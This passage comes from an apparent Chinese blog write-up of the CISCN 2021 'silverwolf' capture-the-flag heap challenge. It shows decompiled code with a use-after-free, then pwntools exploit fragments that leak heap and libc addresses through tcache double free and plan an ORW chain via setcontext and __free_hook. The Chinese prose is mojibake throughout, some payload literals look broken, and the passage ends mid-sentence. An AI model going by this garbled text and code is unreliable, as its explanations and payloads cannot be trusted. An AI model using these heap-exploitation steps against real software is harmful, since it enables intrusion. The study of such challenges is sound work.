class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heap_list )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = heap_list;</span><br><span class="line">      <span class="keyword">if</span> ( size_list )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="type">char</span> *)heap_list + size_list;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p>å¾ˆæ­£å¸¸çš„æ‰“å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; heap_list )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s</span></span><br><span class="line"><span class="string">&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)heap_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>å­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; heap_list )</span><br><span class="line">    <span class="built_in">free</span>(heap_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç›®å‰å·²çŸ¥æœ‰UAFæ¼æ´ï¼Œå¹¶ä¸”é¢˜ç›®æ˜¯Glibc2.27çš„ï¼Œæ‰€ä»¥å­˜åœ¨tcache binï¼Œå¹¶ä¸”éœ€è¦æ‰“ORWï¼Œå…¶å®åœ¨è¿™ä¹‹å‰æˆ‘å¹¶æ²¡æœ‰æ‰“è¿‡å †ä¸Šçš„ORW,ç°åœ¨è¿›è¡Œå°è¯•ï¼Œé¦–å…ˆæˆ‘ä»¬è‚¯å®šéœ€è¦æ³„æ¼libcåœ°å€ï¼Œè€Œä¸€èˆ¬åˆ©ç”¨unshorbinçš„chunkï¼Œå› ä¸ºubçš„fdå’Œbkéƒ½æ˜¯æŒ‡å‘main_anera+ä¸€ä¸ªåç§»çš„åœ°å€ï¼Œä½†æ˜¯ç°åœ¨åªèƒ½ç”³è¯·å°äºç­‰äº0x78å¤§å°çš„chunkï¼Œé‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆç”³è¯·åˆ°éfasrbinçš„chunk,è€Œæˆ‘ä»¬æ˜¯å¤„äºGlibc2.27çš„ç¯å¢ƒä¸‹ï¼Œè€Œtcache binä¼šç”³è¯·ä¸€ä¸ªå¾ˆå¤§çš„chunkï¼Œç”¨äºç®¡ç†tcache biné‡Œé¢çš„chunk,è¿™ä¸ªå¤§çš„chunkåœ¨Glibc2.27å¤§å°æ˜¯0x251ï¼Œè€Œç”±äºå¼€å¯äº†æ²™ç›’ï¼Œå¯¼è‡´ä¼šæœ‰å¾ˆå¤šæ‚ä¹±çš„chunkï¼Œå¦‚å›¾</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/start_bins.png" class><p>é‚£ä¹ˆç°åœ¨å¦‚æœæˆ‘ä»¬èƒ½å¤ŸæŠŠè¿™ä¸ªchunk  freeæ‰ï¼Œä¸å°±å¯ä»¥ä½¿å¾—å®ƒè¿›ubï¼Œä»è€Œå¾—åˆ°libc_addrå˜›ï¼Ÿï¼Œå› æ­¤æˆ‘ä»¬ç°åœ¨éœ€è¦å¾—åˆ°å¾—åˆ°chunkçš„åœ°å€ï¼Œé‚£ä¹ˆæ€ä¹ˆå¾—åˆ°å‘¢ï¼Ÿåœ¨Glibc2.27é’ˆå¯¹tcache binå¼•å…¥äº†keyè¿™ä¸ªç”¨äºæ£€æµ‹double freeçš„æœºåˆ¶ï¼Œå½“ä¸€ä¸ªchunkè¢«freeæ‰ï¼Œè¿›å…¥tcache binçš„æ—¶å€™ï¼Œä¼šæŠŠè¿™ä¸ªåœ°å€å†™å…¥åˆ°chunk_addr+8çš„ä½ç½®ï¼Œå› æ­¤ï¼Œåˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æ³„æ¼å¾—åˆ°heap_addr,</p><h3 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak_heap_addr"></a>leak_heap_addr</h3><p>é‚£ä¹ˆå¥½ï¼Œç°åœ¨å…ˆæ¥å¤„ç†æ³„æ¼heap_addrçš„é—®é¢˜ï¼Œé‚£ä¹ˆç°åœ¨çš„é—®é¢˜æ˜¯ï¼šè¿™ä¸ªkeyä¼šæ£€æµ‹double free,å¦‚æœä¸èƒ½double freeï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›®å‰æ— æ³•å°†freeæ‰çš„è¿™ä¸ªtcache chunkçš„fdä¿®æ”¹ä¸ºå¤„äºå¤´éƒ¨çš„0x251çš„chunk,é‚£ä¹ˆå°±æ— æ³•é€šè¿‡ubæ³„æ¼åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªkeyè¦†ç›–æ‰ï¼Œéšä¾¿è¦†ç›–æˆä»€ä¹ˆï¼Œå› ä¸ºåœ°å€åé¢ç¬¬äºŒæ¬¡freeçš„æ—¶å€™ä¼šé‡æ–°è¦†ç›–ä¸Šï¼Œé‚£ä¹ˆå¥½ï¼Œæ¥çœ‹å˜åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    bug()   </span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_first.png" class><p>è¿™é‡Œæ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œè¿™é‡Œç›´æ¥showæ˜¯å¾—ä¸åˆ°è¿™ä¸ªåœ°å€çš„ï¼Œå› ä¸ºå‰é¢æ˜¯0ï¼Œä¼šè¢« __printf_chkæˆªæ–­æ‰ï¼Œæ‰€ä»¥å¿…é¡»double free</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_second.png" class><p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥double free,å¹¶ä¸”æ³„æ¼åœ°å€äº†ï¼Œ</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_thire.png" class><p>æ‹¿åˆ°åœ°å€ï¼Œä¸ºäº†ç®€çº¦ï¼Œå°†ä»£ç ä¿®æ”¹æˆè¿™æ ·ï¼Œå¹¶ä¸”å°†æ³„æ¼çš„åœ°å€ä½ä¸‰ä½å–0ï¼Œè¿™æ ·å¾—åˆ°å †çš„åŸºåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment"># ========== Exploit å¼€å§‹ ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    heap_addr = uu64(ru(<span class="string">b&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>,drop=<span class="literal">True</span>))&amp;<span class="number">0xffffffffff000</span> </span><br><span class="line">    leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line">    bug()   </span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_addr.png" class><h3 id="ä¿®æ”¹fdä¸ºtcacheçš„å¤§chunk"><a href="#ä¿®æ”¹fdä¸ºtcacheçš„å¤§chunk" class="headerlink" title="ä¿®æ”¹fdä¸ºtcacheçš„å¤§chunk"></a>ä¿®æ”¹fdä¸ºtcacheçš„å¤§chunk</h3><p>å› ä¸ºå·²ç»double freeï¼Œå¹¶ä¸”å­˜åœ¨uafæˆ‘å¯ä»¥å»ä¿®æ”¹chunkçš„fdä¸ºtcache,è¿›è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿæ‹¿åˆ°libcçš„åœ°å€ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/change_to_tb_f.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/change_to_tb_d.png" class><h3 id="ä¿®æ”¹è¿™ä¸ªchunkï¼Œå¹¶ä¸”freeï¼Œæ³„æ¼libc"><a href="#ä¿®æ”¹è¿™ä¸ªchunkï¼Œå¹¶ä¸”freeï¼Œæ³„æ¼libc" class="headerlink" title="ä¿®æ”¹è¿™ä¸ªchunkï¼Œå¹¶ä¸”freeï¼Œæ³„æ¼libc"></a>ä¿®æ”¹è¿™ä¸ªchunkï¼Œå¹¶ä¸”freeï¼Œæ³„æ¼libc</h3><p>ç°åœ¨è¿™é‡Œéœ€è¦å°†tcache binçš„æœºåˆ¶æ¥å¤ä¹  <del>å­¦ä¹ </del> </p><p>tcache binå…¶å®æ˜¯ä¾é æœ€å¼€å§‹ç”³è¯·çš„è¿™ä¸ªå¤§çš„chunkæ¥æ§åˆ¶çš„ï¼Œå‰é¢ä¸€éƒ¨åˆ†æ˜¯countéƒ¨åˆ†ï¼Œå°±æ˜¯ç”¨æ¥ç®¡ç†chunkçš„æ•°é‡çš„ï¼Œä¹Ÿå°±æ˜¯tcache_perthread_structé‡Œé¢çš„countséƒ¨åˆ†ï¼Œå…¶å®tcache_putså’Œtcache_getså°±æ˜¯ä¾ç…§è¿™ä¸ªcountsæ¥ç¡®å®štcachebiné‡Œé¢æ˜¯å¦å­˜åœ¨chunkçš„ï¼Œå¦‚æœè¯´æˆ‘ä»¬æŠŠè¿™ä¸ªè¦†ç›–æˆ7ï¼Œé‚£ä¹ˆå†æ¬¡é‡Šæ”¾å¯¹åº”å¤§å°çš„chunkå°±ä¸ä¼šè¿›å…¥tcachebinï¼Œç›´æ¥è¿›å…¥unshortbinæˆ–è€…fastbinï¼Œå…¶ä¸­æ¯ä¸ªcountsæ‰€å å­—èŠ‚å¤§å°å…¶å®ä¸æ˜¯å›ºå®šçš„ï¼Œä¼šéšç€ç‰ˆæœ¬çš„å˜åŒ–è€Œå˜åŒ–ï¼Œæœ€å¥½çš„è§£å†³åŠæ³•æ˜¯çœ‹æºç ï¼Œæˆ–è€…ï¼Œç›´æ¥è°ƒè¯•ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æ˜¯è°ƒè¯•çš„åŠæ³•ï¼Œ<em>è¿™é‡Œæ˜¯å¦ä¸€ä¸ªé¢˜ç›®çš„ï¼Œä¸æ˜¯è¿™é“é¢˜çš„ï¼Œåªæ˜¯ä¸¾ä¸€ä¸ªä¾‹å­</em></p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test1.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test2.png" class><p>æ‰€ä»¥è¿™é‡Œcountsçš„å¤§å°å°±æ˜¯ä¸¤ä¸ªå­—èŠ‚</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test3.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test4.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test5.png" class><p>è¿™æ ·å°±æ˜¯å¯¹åº”çš„è·ç¦»äº†ï¼Œ</p><p>å¥½äº†ï¼Œæ—¢ç„¶äº†è§£äº†è¿™éƒ¨åˆ†countsçš„çŸ¥è¯†ï¼Œç°åœ¨æˆ‘ä»¬æ˜¯åœ¨è¿™ä¸ª0x251çš„chunkä¸Šï¼Œé‚£ä¹ˆç°åœ¨æ‰¾åˆ°0x250çš„ä½ç½®ï¼Œå¹¶ä¸”å°†å¯¹åº”çš„éƒ¨åˆ†è¦†ç›–ä¸º7ï¼Œå¹¶ä¸”freeæ‰è¿™ä¸ªchunkä½¿å…¶è¿›å…¥ubï¼Œä»è€Œæ³„æ¼åœ°å€</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_libc1.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_libc2.png" class><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&#x27;&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„libc_baseå¯ä»¥ç›´æ¥ç¡¬ç¼–ç è®¡ç®—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•ï¼Œæ¯”å¦‚å‡å»libc.sym.main_anera</p><h3 id="æ¥ä¸‹æ¥å°±è¦è€ƒè™‘ORWäº†"><a href="#æ¥ä¸‹æ¥å°±è¦è€ƒè™‘ORWäº†" class="headerlink" title="æ¥ä¸‹æ¥å°±è¦è€ƒè™‘ORWäº†"></a>æ¥ä¸‹æ¥å°±è¦è€ƒè™‘ORWäº†</h3><p>å› ä¸ºå¼€å¯äº†æ²™ç®±ï¼Œå¾ˆæ˜æ˜¾ï¼Œåªæƒ³è®©æˆ‘ä»¬æ‰“ORW,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â¯ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè®©æˆ‘ä»¬å›æƒ³ä¸€ä¸‹åœ¨æ ˆä¸Šæ‰“ORWçš„æ—¶å€™æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œè¦ä¹ˆæ„é€ ROPï¼Œè¦ä¹ˆå†™shellcode,è€Œåœ¨å †ä¸Šæ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥åœ¨å †å†…å­˜ä¸Šæ‰§è¡Œä»£ç çš„ï¼Œç°åœ¨å°±è¦å¼•ç”³ä¸€ä¸ªæ¦‚å¿µï¼Œå°±æ˜¯æ ˆè¿ç§»æ˜¯ä¸ºäº†ä»€ä¹ˆï¼Œæ ˆè¿ç§»æ˜¯ä¸æ˜¯å®é™…ä¸Šå°±æ˜¯é€šè¿‡rbpå»æ§åˆ¶rspï¼Œè¿™æ ·å°±æŠŠrspè¿ç§»åˆ°ä»»æ„ä½ç½®ï¼Œè¿™æ ·çš„è¯æ ˆä¹Ÿå°±è¢«è¿ç§»åˆ°å…¶ä»–åœ°æ–¹äº†,æ¥ä¸‹æ¥åªè¦è¿™ä¸ªåœ°æ–¹å­˜åœ¨ROPï¼Œå°±å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œå› ä¸ºROPçš„gadgetåœ¨textæ®µä¸Šï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™æ˜¯åœ¨æ ˆä¸Šï¼Œä¸€èˆ¬ä¹Ÿä¼šè¿ç§»åˆ°.bssæ®µä¸Šï¼Œä½†æ˜¯åœ¨å †ä¸Šå‘¢ï¼Ÿåº”è¯¥æ€ä¹ˆåšï¼Ÿ</p><p>è€Œåœ¨Glibcä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œsetcontextï¼Œè€Œè¿™ä¸ªå‡½æ•°åˆä»¥2.27,2.29ä¸ºåˆ†ç•Œï¼Œåœ¨è¿™é‡Œä¸è¯¦ç»†è¯´æ˜ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªå‡½æ•°åœ¨2.27çš„æ ·å­ï¼Œ</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/setcontext.png" class><p>ä¸»è¦æ³¨æ„è¿™éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä½¿ç”¨rdiæ¥æ§åˆ¶æ‰€æœ‰é€šç”¨å¯„å­˜å™¨çš„å€¼ï¼Œä½†æ˜¯è¿™é‡Œä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯ï¼Œè¿™é‡Œä¼šé€šè¿‡rdi+0xa0çš„åœ°å€ç»™rsp,spæ˜¯æ ˆé¡¶æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯rspå¾€ä¸‹ï¼Œéƒ½ä¼šè¢«è®¤ä¸ºæ˜¯æ ˆï¼Œè¿™æ ·çš„è¯ä¸å°±å¯ä»¥æ§åˆ¶rspå»æ‰§è¡ŒROPâ€”â€“ORWäº†å˜›ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨éœ€è¦è€ƒè™‘æ€ä¹ˆå¸ƒç½®è¿™ä¸ªä¼ªé€ çš„æ ˆå¸§äº†ï¼Œå…¶å®å¦‚æœæƒ³æ‰§è¡Œåˆ°è¿™é‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿè®¸éœ€è¦å€ŸåŠ©hookå‡½æ•°ï¼Œ</p><p>é¦–å…ˆè¿™é‡Œæ˜¯é€šè¿‡rdiæ¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥rdiä¸€å®šå¾—æ˜¯å †ä¸Šçš„æŸä¸ªåœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨å †ä¸Šæ‰§è¡ŒORW,</p><p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå¸ƒç½®è¿™äº›å‘¢ï¼Ÿ,å¦‚ä¸‹ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">b&#x27;&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym.__free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x1000</span>)    <span class="comment"># flag_addr heap:0x40</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x2000</span>)    <span class="comment"># fake_chunk heap:0x50</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x20a0</span>)    <span class="comment"># stack 2 heap:0x60</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x3000</span>)    <span class="comment"># orw1 heap:0x70</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x3060</span>)    <span class="comment"># orw2 heap:0x80 continue orw1</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ç°åœ¨çš„æˆ‘ä»¬è¿˜å¤„äºtcache bin çš„è¿™ä¸ªå·¨å¤§çš„ç»“æ„ä½“å †é‡Œé¢ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªç»“æ„ä½“æ¥å¸ƒç½®chunkçš„ï¼Œé¦–å…ˆæŠŠå‰é¢çš„countså¡«ä¸€ä¸‹ï¼Œéšä¾¿å¡«ä¸€ç‚¹ï¼Œç„¶åå°±æ˜¯free_hook,ä»è¿™é‡Œå¼€å§‹æ˜¯tcache biné‡Œé¢æ¯ä¸€ä¸ªchunké˜Ÿåˆ—çš„å¤´çš„åœ°å€å¯¹åº”çš„chunkçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯tcache_entry-&gt;*nextï¼Œ<del>æˆ‘åœ¨è¯´ä»€ä¹ˆå‘¢ï¼Ÿ</del>,å…¶å®å°±æ˜¯chunké˜Ÿåˆ—çš„å¤´ï¼Œé“¾æ¥çš„chunkï¼Œå°±æ¯”å¦‚ï¼š0x20ï¼šchunk1â€“&gt;chunk2ï¼Œè¿™é‡Œæˆ‘æ‰€è®²çš„å°±æ˜¯chunk1</p><p>é‚£ä¹ˆæŒ‰ç…§è¿™æ ·å¸ƒç½®ï¼Œå°±ä¼šä½¿å¾—å¯¹åº”sizeçš„chunkåœ°å€ä¸ºæˆ‘ä»¬æ‰€å¸ƒç½®çš„ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x20</span>--&gt;free_hookï¼›<span class="number">0x30</span>ç”¨ä¸ä¸Šï¼Œæ‰€ä»¥éšæ„è¦†ç›–ï¼›</span><br><span class="line"><span class="number">0x40</span>--&gt;heap_addr+<span class="number">0x1000</span>ï¼›<span class="number">0x50</span>--&gt;heap_addr+<span class="number">0x2000</span>ï¼›</span><br><span class="line"><span class="number">0x60</span>--&gt;heap_addr+<span class="number">0x20a0</span>ï¼›<span class="number">0x70</span> --&gt;heap_addr+<span class="number">0x3000</span> ; </span><br><span class="line"><span class="number">0x80</span> --&gt;heap_addr+<span class="number">0x3060</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨ï¼Œåªè¦ç”³è¯·å¯¹åº”sizeå¤§å°å°±å¯ä»¥æ§åˆ¶å¯¹åº”çš„å†…å­˜äº†ï¼Œè‡³äºè¿™é‡Œçš„chunkçš„åœ°å€ä¸ºä»€ä¹ˆæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä¸€ä¸ªä¸€ä¸ªçš„è§£é‡Šï¼Œ</p><p>è¿˜è®°å¾—ä¸Šé¢è¯´è¿‡çš„ï¼Œéœ€è¦æŠŠrspæ§åˆ¶åˆ°å 